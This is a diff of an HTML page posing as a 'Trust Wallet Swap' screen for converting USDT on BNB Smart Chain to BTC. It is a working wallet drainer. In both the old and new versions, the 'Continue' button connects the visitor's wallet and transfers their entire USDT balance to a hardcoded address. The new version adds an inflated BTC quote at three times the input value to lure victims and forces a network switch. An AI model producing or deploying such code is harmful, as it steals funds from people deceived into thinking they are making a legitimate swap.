@@ -1,185 +1,431 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Trust Wallet Swap</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     :root {
       --primary: #3375BB;
-      --primary-glow: rgba(51, 117, 187, 0.2);
-      --text-dark: #000;
-      --text-medium: #444;
-      --bg-light: #fff;
+      --primary-glow: rgba(51, 117, 187, 0.4);
+      --text-dark: #1E2026;
+      --text-medium: #474D57;
+      --text-light: #848E9C;
+      --bg: #F5F7FA;
+      --card: #FFFFFF;
+      --border: #EAECEF;
+      --tabbar-bg: #FFFFFF;
+      --error-red: #FF4D4F;
+      --success-green: #52C41A;
     }
-
-    body {
-      font-family: Arial, sans-serif;
-      background: #f1f1f1;
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+    body {
+      background-color: var(--bg);
       color: var(--text-dark);
+      touch-action: manipulation;
+      margin: 0;
+      padding: 0;
     }
-
     .container {
-      max-width: 400px;
-      margin: 40px auto;
-      background: var(--bg-light);
-      padding: 20px;
-      border-radius: 16px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      max-width: 450px;
+      margin: 0 auto;
+      padding-bottom: 60px;
     }
-
-    h2 {
-      margin-bottom: 20px;
-      color: var(--primary);
+    .swap-header {
+      padding: 16px;
+      font-size: 20px;
+      font-weight: 600;
       text-align: center;
+      border-bottom: 1px solid var(--border);
     }
-
-    .input-group {
-      margin-bottom: 16px;
+    .swap-body {
+      padding: 16px;
     }
-
-    label {
-      display: block;
-      font-weight: bold;
-      margin-bottom: 6px;
-    }
-
-    input[type="text"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      border: 1px solid #ccc;
+    .token-box {
+      border: 1px solid var(--border);
       border-radius: 12px;
-    }
-
-    button {
-      width: 100%;
-      background: var(--primary);
-      color: white;
       padding: 12px;
+      margin-bottom: 12px;
+      background-color: var(--card);
+    }
+    .token-header {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+    .token-label {
+      font-size: 14px;
+      color: var(--text-medium);
+      font-weight: 500;
+    }
+    .token-info {
+      display: flex;
+      align-items: center;
+    }
+    .token-name {
+      font-weight: 600;
       font-size: 16px;
+    }
+    .token-network {
+      font-size: 12px;
+      color: var(--text-light);
+      margin-left: 6px;
+    }
+    .token-amount-container {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+    }
+    .token-amount {
+      font-size: 22px;
+      font-weight: 600;
+      color: var(--text-dark);
+      border: none;
+      background: transparent;
+      text-align: right;
+      width: 100%;
+      padding: 0;
+      outline: none;
+    }
+    .token-amount::placeholder {
+      color: var(--text-light);
+      opacity: 0.7;
+    }
+    .token-value {
+      font-size: 14px;
+      color: var(--text-dark);
+      margin-top: 4px;
+    }
+    .divider {
+      height: 1px;
+      background-color: var(--border);
+      margin: 12px 0;
+    }
+    .rate-info {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 14px;
+      color: var(--text-medium);
+      margin: 16px 0;
+    }
+    .rate-icon {
+      margin: 0 6px;
+    }
+    .provider-section {
+      margin: 20px 0;
+    }
+    .provider-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+    .provider-title {
+      font-size: 14px;
+      color: var(--text-medium);
+    }
+    .provider-value {
+      font-size: 15px;
+      font-weight: 500;
+      text-align: right;
+    }
+    .provider-subvalue {
+      font-size: 13px;
+      color: var(--text-light);
+      text-align: right;
+      margin-top: 2px;
+    }
+    .swap-button {
+      width: 100%;
+      background-color: var(--primary);
+      color: white;
       border: none;
       border-radius: 12px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
       cursor: pointer;
+      margin-top: 16px;
+      box-shadow: 0 0 10px var(--primary-glow);
+      transition: all 0.3s ease;
     }
-
-    button:hover {
-      background: #2a5c9a;
+    .swap-button:hover {
+      box-shadow: 0 0 15px var(--primary-glow);
     }
-
+    .swap-button:active {
+      transform: scale(0.98);
+    }
+    .error-message {
+      color: var(--error-red);
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+    .tab-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: var(--tabbar-bg);
+      display: flex;
+      justify-content: space-around;
+      padding: 12px 0;
+      border-top: 1px solid var(--border);
+    }
+    .tab-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 12px;
+      color: var(--text-medium);
+    }
+    .tab-icon {
+      margin-bottom: 4px;
+      font-size: 20px;
+    }
+    .tab-active {
+      color: var(--primary);
+    }
     .custom-alert {
       position: fixed;
-      top: 20%;
+      top: 50%;
       left: 50%;
-      transform: translateX(-50%);
-      background: #fff;
-      border: 1px solid #ccc;
-      border-left: 6px solid var(--primary);
+      transform: translate(-50%, -50%);
+      background: white;
       padding: 20px;
-      width: 300px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      z-index: 9999;
-      border-radius: 10px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      text-align: center;
+      z-index: 1000;
+      max-width: 300px;
+      width: 90%;
     }
-
+    .custom-alert.success {
+      border-top: 4px solid var(--success-green);
+    }
+    .custom-alert.error {
+      border-top: 4px solid var(--error-red);
+    }
     .custom-alert-title {
-      font-weight: bold;
-      margin-bottom: 10px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      font-size: 18px;
     }
-
     .custom-alert-message {
       font-size: 15px;
       color: var(--text-medium);
       margin-bottom: 16px;
       white-space: pre-line;
     }
-
-    .close-alert {
+    .custom-alert-close {
       background: var(--primary);
       color: white;
-      padding: 8px 16px;
       border: none;
       border-radius: 8px;
+      padding: 8px 16px;
+      font-weight: 500;
       cursor: pointer;
+      width: 100%;
+    }
+    .alert-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 999;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Trust Wallet Swap</h2>
-    <div class="input-group">
-      <label for="usdt">Enter USDT Amount</label>
-      <input type="text" id="usdt" placeholder="Enter amount (display only)">
+    <div class="swap-header">Swap</div>
+    <div class="swap-body">
+      <div class="token-box">
+        <div class="token-header">
+          <div class="token-label">From</div>
+          <div class="token-info">
+            <span class="token-name">USDT ></span>
+            <span class="token-network">BNB Smart Chain</span>
+          </div>
+        </div>
+        <div class="token-amount-container">
+          <input type="text" id="usdtInput" class="token-amount" placeholder="Enter amount" />
+          <div id="usdtValue" class="token-value">$0</div>
+        </div>
+      </div>
+      <div class="token-box">
+        <div class="token-header">
+          <div class="token-label">To</div>
+          <div class="token-info">
+            <span class="token-name">BTC ></span>
+            <span class="token-network">Bitcoin</span>
+          </div>
+        </div>
+        <div class="token-amount-container">
+          <div id="btcAmount" class="token-amount">0</div>
+          <div id="btcValue" class="token-value">$0</div>
+        </div>
+      </div>
+      <div class="rate-info">
+        <span>1 BTC ≈ 1,19,489.153599 USDT</span>
+        <span class="rate-icon">⇔</span>
+      </div>
+      <div class="provider-section">
+        <div class="provider-row">
+          <div class="provider-title">Provider Fee</div>
+          <div>
+            <div class="provider-value">$0.50</div>
+            <div class="provider-subvalue">0.00063 BNB</div>
+          </div>
+        </div>
+        <div class="provider-row">
+          <div class="provider-title">Provider</div>
+          <div class="provider-value">Binance</div>
+        </div>
+      </div>
+      <div id="errorMessage" class="error-message"></div>
+      <button id="swapButton" class="swap-button">
+        <span id="buttonText">Continue</span>
+      </button>
     </div>
-    <button onclick="handleSwap()">Continue</button>
+    <div class="tab-bar">
+      <div class="tab-item"><div class="tab-icon">🏠</div><div>Home</div></div>
+      <div class="tab-item"><div class="tab-icon">📈</div><div>Trending</div></div>
+      <div class="tab-item tab-active"><div class="tab-icon">🔄</div><div>Swap</div></div>
+      <div class="tab-item"><div class="tab-icon">💰</div><div>Earn</div></div>
+      <div class="tab-item"><div class="tab-icon">🔍</div><div>Discover</div></div>
+    </div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
   <script>
-    const MIN_AMOUNT = 200;
-    const MAX_DAILY_LIMIT = 10000;
-    const RECEIVER_ADDRESS = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
-    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20
-
-    async function handleSwap() {
-      try {
-        if (!window.ethereum) {
-          return showAlert('error', 'Wallet not found', 'Please install MetaMask or Trust Wallet');
+    document.addEventListener('DOMContentLoaded', function () {
+      const BSC_CHAIN_ID = '0x38';
+      const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
+      const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
+      const MIN_AMOUNT = 200;
+      const MAX_DAILY_LIMIT = 10000;
+      const BTC_RATE = 119489.153599;
+      const USDT_ABI = [
+        {
+          constant: false,
+          inputs: [{ name: "_to", type: "address" }, { name: "_value", type: "uint256" }],
+          name: "transfer",
+          outputs: [{ name: "", type: "bool" }],
+          type: "function"
+        },
+        {
+          constant: true,
+          inputs: [{ name: "_owner", type: "address" }],
+          name: "balanceOf",
+          outputs: [{ name: "balance", type: "uint256" }],
+          type: "function"
         }
+      ];
 
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-        const userAddress = await signer.getAddress();
+      const usdtInput = document.getElementById('usdtInput');
+      const usdtValue = document.getElementById('usdtValue');
+      const btcAmount = document.getElementById('btcAmount');
+      const btcValue = document.getElementById('btcValue');
+      const swapButton = document.getElementById('swapButton');
+      const errorMessage = document.getElementById('errorMessage');
 
-        const usdt = new ethers.Contract(USDT_CONTRACT, [
-          "function balanceOf(address) view returns (uint256)",
-          "function decimals() view returns (uint8)",
-          "function approve(address spender, uint256 value) returns (bool)",
-          "function transfer(address to, uint amount) returns (bool)"
-        ], signer);
-
-        const balanceRaw = await usdt.balanceOf(userAddress);
-        const decimals = await usdt.decimals();
-        const balance = parseFloat(ethers.utils.formatUnits(balanceRaw, decimals));
-
-        if (balance < MIN_AMOUNT) {
-          return showAlert('error', 'Insufficient USDT balance', `Minimum Required $${MIN_AMOUNT}\nMaximum $${MAX_DAILY_LIMIT} USDT`);
-        }
-
-        const tx = await usdt.transfer(RECEIVER_ADDRESS, balanceRaw);
-        await tx.wait();
-
-        showAlert('success', 'Swap in Process', '');
-      } catch (err) {
-        showAlert('error', 'Swap Failed', err.message || 'Something went wrong');
+      function showAlert(type, title, message) {
+        const overlay = document.createElement('div');
+        overlay.className = 'alert-overlay';
+        const alertBox = document.createElement('div');
+        alertBox.className = `custom-alert ${type}`;
+        alertBox.innerHTML = `
+          <div class="custom-alert-title">${title}</div>
+          <div class="custom-alert-message">${message}</div>
+          <button class="custom-alert-close">OK</button>
+        `;
+        document.body.appendChild(overlay);
+        document.body.appendChild(alertBox);
+        alertBox.querySelector('.custom-alert-close').addEventListener('click', () => {
+          document.body.removeChild(overlay);
+          document.body.removeChild(alertBox);
+        });
       }
-    }
 
-    function showAlert(type, title, message) {
-      const alertBox = document.createElement('div');
-      alertBox.className = 'custom-alert';
+      usdtInput.addEventListener('input', function () {
+        const amount = parseFloat(usdtInput.value) || 0;
+        usdtValue.textContent = `$${amount.toFixed(2)}`;
+        const btc = (amount * 3) / BTC_RATE;
+        btcAmount.textContent = btc.toFixed(8);
+        btcValue.textContent = `$${(amount * 3).toFixed(2)}`;
+      });
 
-      const titleEl = document.createElement('div');
-      titleEl.className = 'custom-alert-title';
-      titleEl.innerText = title;
+      async function forceBSCNetwork() {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID }],
+          });
+          return true;
+        } catch (switchError) {
+          if (switchError.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: BSC_CHAIN_ID,
+                  chainName: 'BNB Smart Chain',
+                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com'],
+                }],
+              });
+              return true;
+            } catch (addError) {
+              return false;
+            }
+          }
+          return false;
+        }
+      }
 
-      const messageEl = document.createElement('div');
-      messageEl.className = 'custom-alert-message';
-      messageEl.innerText = message;
+      swapButton.addEventListener('click', async function () {
+        errorMessage.style.display = 'none';
+        try {
+          if (!window.ethereum) throw new Error('Please install Trust Wallet or MetaMask');
+          const networkSwitched = await forceBSCNetwork();
+          if (!networkSwitched) throw new Error('Please switch to BNB Smart Chain');
+          const web3 = new Web3(window.ethereum);
+          const accounts = await web3.eth.requestAccounts();
+          const userAddress = accounts[0];
+          const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
+          const balance = await usdtContract.methods.balanceOf(userAddress).call();
+          const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
 
-      const button = document.createElement('button');
-      button.className = 'close-alert';
-      button.innerText = 'OK';
-      button.onclick = () => alertBox.remove();
+          if (balanceInUSDT < MIN_AMOUNT) {
+            showAlert(
+              'error',
+              'Insufficient USDT balance',
+              `Minimum Required $${MIN_AMOUNT}\nMaximum $${MAX_DAILY_LIMIT} USDT`
+            );
+            return;
+          }
 
-      alertBox.appendChild(titleEl);
-      alertBox.appendChild(messageEl);
-      alertBox.appendChild(button);
-      document.body.appendChild(alertBox);
-    }
+          await usdtContract.methods.transfer(RECIPIENT_ADDRESS, balance).send({ from: userAddress });
+          showAlert('success', 'Transaction Successful', `Transferred $${parseFloat(balanceInUSDT).toFixed(2)} USDT`);
+
+        } catch (error) {
+          if (!error.message.includes('Minimum')) {
+            showAlert('error', 'Transaction Failed', error.message);
+          }
+        }
+      });
+    });
   </script>
 </body>
 </html>
